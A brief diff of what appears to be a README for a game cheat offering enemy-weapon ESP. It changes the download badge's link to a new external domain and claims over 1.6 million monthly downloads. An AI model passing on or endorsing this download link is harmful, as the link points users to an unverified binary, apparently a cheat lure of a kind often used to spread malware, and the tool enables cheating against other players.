@@ -49,7 +49,7 @@ A: Yes — see exact weapons enemies are carrying.
 
 **Monthly downloads:** 1.6m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://forumconnect.uk/valesphack)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/valesphack)
 
 ---
 
